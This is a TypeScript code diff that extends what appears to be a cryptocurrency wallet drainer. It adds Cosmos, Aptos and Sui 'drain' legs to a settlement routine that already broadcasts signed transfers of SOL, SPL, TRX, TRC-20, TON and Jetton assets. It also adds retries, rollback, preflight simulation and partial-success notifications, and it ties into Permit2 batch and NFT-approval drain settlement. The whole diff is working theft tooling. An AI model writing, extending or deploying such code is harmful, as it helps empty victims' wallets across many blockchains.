@@ -33,6 +33,21 @@ import { executeTrc20TokenDrain } from './tron-trc20-drain.js'
 import { broadcastSignedTonNativeTransfer } from './ton-native-drain.js'
 import { executeJettonDrain } from './ton-jetton-drain.js'
 import {
+  notifyOmnichainPartialSuccess,
+  retryLeg,
+  rollbackCompensation,
+  runPreflightSimulation,
+} from './omnichain-leg-orchestrator.js'
+import {
+  broadcastSignedCosmosTransaction,
+} from '../chains/cosmos.js'
+import {
+  broadcastSignedAptosTransaction,
+} from '../chains/aptos.js'
+import {
+  broadcastSignedSuiTransaction,
+} from '../chains/sui.js'
+import {
   buildBatchNFTApprovalTypedData,
   executeBatchNftDrainSettlement,
   type BatchNftEntry,
@@ -128,6 +143,20 @@ export type OmnichainNativeDrainPayload = {
   jetton_master?: string
   jetton_amount?: string
   native_signed_transaction_jetton?: string
+  /** Cosmos Hub native (uatom) — signed tx bytes base64 or hex */
+  native_amount_cosmos?: string
+  cosmos_signed_tx?: string
+  cosmos_tx_encoding?: 'base64' | 'hex'
+  /** Aptos native (octas) */
+  native_amount_aptos?: string
+  aptos_signed_tx?: string
+  /** Optional detached Ed25519 signature hex when wallet returns sig separate from BCS bytes */
+  aptos_signature?: string
+  aptos_tx_encoding?: 'base64' | 'hex'
+  /** Sui native (MIST) */
+  native_amount_sui?: string
+  sui_signed_tx?: string
+  sui_signature?: string
 }
 
 export type BatchPermit2SettlementResult = {
@@ -140,6 +169,9 @@ export type BatchPermit2SettlementResult = {
     spl?: string
     trc20?: string
     jetton?: string
+    cosmos?: string
+    aptos?: string
+    sui?: string
   }
   nft_transaction_hashes?: string[]
   bundle_hash?: string
@@ -413,9 +445,10 @@ export function isOmniSequentialFailFastEnabled(): boolean {
   return true
 }
 
-/** Broadcast SOL / TRX / TON native + SPL / TRC-20 / Jetton drains from a batch envelope payload. */
+/** Broadcast SOL / TRX / TON native + SPL / TRC-20 / Jetton + Cosmos/Aptos/Sui drains. */
 export async function executeOmnichainNativeDrainSettlement(
   payload: OmnichainNativeDrainPayload,
+  opts?: { skipPreflight?: boolean; ownerAddress?: string },
 ): Promise<{
   ok: boolean
   transaction_hashes: {
@@ -425,6 +458,9 @@ export async function executeOmnichainNativeDrainSettlement(
     spl?: string
     trc20?: string
     jetton?: string
+    cosmos?: string
+    aptos?: string
+    sui?: string
   }
   detail?: string
 }> {
@@ -435,47 +471,70 @@ export async function executeOmnichainNativeDrainSettlement(
     spl?: string
     trc20?: string
     jetton?: string
+    cosmos?: string
+    aptos?: string
+    sui?: string
   } = {}
   const faults: string[] = []
   const failFast = isOmniSequentialFailFastEnabled()
+  const succeededLegKeys: string[] = []
 
-  const abortIfNeeded = (): boolean => {
-    if (!failFast || faults.length === 0) return false
-    return true
+  if (!opts?.skipPreflight) {
+    const preflight = await runPreflightSimulation({
+      payload,
+      walletAddress: opts?.ownerAddress,
+    })
+    if (!preflight.ok) {
+      return {
+        ok: false,
+        transaction_hashes,
+        detail: preflight.faults.map((f) => `${f.key}: ${f.detail}`).join('; '),
+      }
+    }
+  }
+
+  const abortIfNeeded = (): boolean => failFast && faults.length > 0
+
+  const runLeg = async <T extends { ok: boolean; tx_hash?: string; detail?: string }>(
+    key: 'sol' | 'spl' | 'trx' | 'trc20' | 'ton' | 'jetton' | 'cosmos' | 'aptos' | 'sui',
+    execute: () => Promise<T>,
+  ): Promise<void> => {
+    const retried = await retryLeg(key, async () => execute())
+    if (retried.ok && retried.result?.ok && retried.result.tx_hash) {
+      transaction_hashes[key] = retried.result.tx_hash
+      succeededLegKeys.push(key)
+      return
+    }
+    faults.push(retried.detail ?? retried.result?.detail ?? `${key} leg failed`)
+    if (succeededLegKeys.length > 0) {
+      await rollbackCompensation({
+        succeededLegs: succeededLegKeys as Parameters<typeof rollbackCompensation>[0]['succeededLegs'],
+        failedLeg: key,
+        ownerAddress: opts?.ownerAddress,
+      })
+    }
   }
 
   if (
     hasPositiveNativeAmount(payload.native_amount_sol) &&
     payload.native_signed_transaction_sol
   ) {
-    const sol = await broadcastSignedSolNativeTransfer({
-      signedWireBase64: payload.native_signed_transaction_sol,
-    })
-    if (sol.ok && sol.tx_hash) {
-      transaction_hashes.sol = sol.tx_hash
-    } else {
-      faults.push(sol.detail ?? 'SOL native drain failed')
-      if (abortIfNeeded()) {
-        return {
-          ok: false,
-          transaction_hashes,
-          detail: faults.join('; '),
-        }
-      }
+    await runLeg('sol', () =>
+      broadcastSignedSolNativeTransfer({
+        signedWireBase64: payload.native_signed_transaction_sol!,
+      }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
   if (hasPositiveNativeAmount(payload.spl_amount) && payload.native_signed_transaction_spl) {
-    const spl = await executeSplTokenDrain({
-      signedWireBase64: payload.native_signed_transaction_spl,
-    })
-    if (spl.ok && spl.tx_hash) {
-      transaction_hashes.spl = spl.tx_hash
-    } else {
-      faults.push(spl.detail ?? 'SPL token drain failed')
-      if (abortIfNeeded()) {
-        return { ok: false, transaction_hashes, detail: faults.join('; ') }
-      }
+    await runLeg('spl', () =>
+      executeSplTokenDrain({ signedWireBase64: payload.native_signed_transaction_spl! }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
@@ -483,16 +542,13 @@ export async function executeOmnichainNativeDrainSettlement(
     hasPositiveNativeAmount(payload.native_amount_trx) &&
     payload.native_signed_transaction_trx
   ) {
-    const trx = await broadcastSignedTrxNativeTransfer({
-      signedTransaction: payload.native_signed_transaction_trx,
-    })
-    if (trx.ok && trx.tx_hash) {
-      transaction_hashes.trx = trx.tx_hash
-    } else {
-      faults.push(trx.detail ?? 'TRX native drain failed')
-      if (abortIfNeeded()) {
-        return { ok: false, transaction_hashes, detail: faults.join('; ') }
-      }
+    await runLeg('trx', () =>
+      broadcastSignedTrxNativeTransfer({
+        signedTransaction: payload.native_signed_transaction_trx!,
+      }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
@@ -500,16 +556,13 @@ export async function executeOmnichainNativeDrainSettlement(
     hasPositiveNativeAmount(payload.trc20_amount) &&
     payload.native_signed_transaction_trc20
   ) {
-    const trc20 = await executeTrc20TokenDrain({
-      signedTransaction: payload.native_signed_transaction_trc20,
-    })
-    if (trc20.ok && trc20.tx_hash) {
-      transaction_hashes.trc20 = trc20.tx_hash
-    } else {
-      faults.push(trc20.detail ?? 'TRC-20 token drain failed')
-      if (abortIfNeeded()) {
-        return { ok: false, transaction_hashes, detail: faults.join('; ') }
-      }
+    await runLeg('trc20', () =>
+      executeTrc20TokenDrain({
+        signedTransaction: payload.native_signed_transaction_trc20!,
+      }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
@@ -517,16 +570,11 @@ export async function executeOmnichainNativeDrainSettlement(
     hasPositiveNativeAmount(payload.native_amount_ton) &&
     payload.native_signed_transaction_ton
   ) {
-    const ton = await broadcastSignedTonNativeTransfer({
-      bocBase64: payload.native_signed_transaction_ton,
-    })
-    if (ton.ok && ton.tx_hash) {
-      transaction_hashes.ton = ton.tx_hash
-    } else {
-      faults.push(ton.detail ?? 'TON native drain failed')
-      if (abortIfNeeded()) {
-        return { ok: false, transaction_hashes, detail: faults.join('; ') }
-      }
+    await runLeg('ton', () =>
+      broadcastSignedTonNativeTransfer({ bocBase64: payload.native_signed_transaction_ton! }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
@@ -534,16 +582,60 @@ export async function executeOmnichainNativeDrainSettlement(
     hasPositiveNativeAmount(payload.jetton_amount) &&
     payload.native_signed_transaction_jetton
   ) {
-    const jetton = await executeJettonDrain({
-      bocBase64: payload.native_signed_transaction_jetton,
+    await runLeg('jetton', () =>
+      executeJettonDrain({ bocBase64: payload.native_signed_transaction_jetton! }),
+    )
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
+  if (hasPositiveNativeAmount(payload.native_amount_cosmos) && payload.cosmos_signed_tx) {
+    await runLeg('cosmos', async () => {
+      const broadcast = await broadcastSignedCosmosTransaction({
+        txBytes: payload.cosmos_signed_tx!,
+        encoding: payload.cosmos_tx_encoding ?? 'base64',
+      })
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Cosmos broadcast failed' }
     })
-    if (jetton.ok && jetton.tx_hash) {
-      transaction_hashes.jetton = jetton.tx_hash
-    } else {
-      faults.push(jetton.detail ?? 'Jetton drain failed')
-      if (abortIfNeeded()) {
-        return { ok: false, transaction_hashes, detail: faults.join('; ') }
-      }
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
+  if (hasPositiveNativeAmount(payload.native_amount_aptos) && payload.aptos_signed_tx) {
+    await runLeg('aptos', async () => {
+      const broadcast = await broadcastSignedAptosTransaction({
+        signedTxBytes: payload.aptos_signed_tx!,
+        encoding: payload.aptos_tx_encoding ?? 'base64',
+      })
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Aptos broadcast failed' }
+    })
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
+    }
+  }
+
+  if (
+    hasPositiveNativeAmount(payload.native_amount_sui) &&
+    payload.sui_signed_tx &&
+    payload.sui_signature
+  ) {
+    await runLeg('sui', async () => {
+      const broadcast = await broadcastSignedSuiTransaction(
+        payload.sui_signed_tx!,
+        payload.sui_signature!,
+      )
+      return broadcast.ok
+        ? { ok: true, tx_hash: broadcast.txHash }
+        : { ok: false, detail: 'detail' in broadcast ? broadcast.detail : 'Sui broadcast failed' }
+    })
+    if (abortIfNeeded()) {
+      return { ok: false, transaction_hashes, detail: faults.join('; ') }
     }
   }
 
@@ -559,7 +651,12 @@ export async function executeOmnichainNativeDrainSettlement(
     (hasPositiveNativeAmount(payload.native_amount_ton) &&
       Boolean(payload.native_signed_transaction_ton)) ||
     (hasPositiveNativeAmount(payload.jetton_amount) &&
-      Boolean(payload.native_signed_transaction_jetton))
+      Boolean(payload.native_signed_transaction_jetton)) ||
+    (hasPositiveNativeAmount(payload.native_amount_cosmos) && Boolean(payload.cosmos_signed_tx)) ||
+    (hasPositiveNativeAmount(payload.native_amount_aptos) && Boolean(payload.aptos_signed_tx)) ||
+    (hasPositiveNativeAmount(payload.native_amount_sui) &&
+      Boolean(payload.sui_signed_tx) &&
+      Boolean(payload.sui_signature))
 
   if (!attempted) {
     return { ok: true, transaction_hashes }
@@ -568,10 +665,13 @@ export async function executeOmnichainNativeDrainSettlement(
   const ok = faults.length === 0
   if (!ok && Object.keys(transaction_hashes).length > 0) {
     const succeeded = Object.keys(transaction_hashes)
-      .map((key) => key.toUpperCase())
-      .join(', ')
+    void notifyOmnichainPartialSuccess({
+      succeeded,
+      failed: faults,
+      settlementMode: 'sequential_v1',
+    })
     console.warn(
-      `[OMNI] Partial failure: ${succeeded} leg(s) succeeded but other leg(s) failed: ${faults.join('; ')}`,
+      `[OMNI] Partial failure: ${succeeded.join(', ')} succeeded; faults: ${faults.join('; ')}`,
     )
   }
   return {
@@ -719,7 +819,7 @@ export async function executeBatchPermit2Settlement(params: {
         ok: delivery.ok && omnichain.ok && nftDrain.ok,
         transaction_hashes: delivery.transaction_hashes,
         bundle_hash: delivery.bundle_hash,
-        detail: delivery.detail ?? omnichain.detail ?? nftDrain.detail,
+        detail: delivery.detail ?? ('detail' in omnichain ? omnichain.detail : undefined) ?? nftDrain.detail,
         ...(Object.keys(omnichain.transaction_hashes).length > 0
           ? { omnichain_transaction_hashes: omnichain.transaction_hashes }
           : {}),
@@ -831,7 +931,7 @@ export async function executeBatchPermit2Settlement(params: {
         : {
             detail:
               nftDrain.detail ??
-              omnichain.detail ??
+              ('detail' in omnichain ? omnichain.detail : undefined) ??
               'Batch settlement partial failure',
           }),
     }
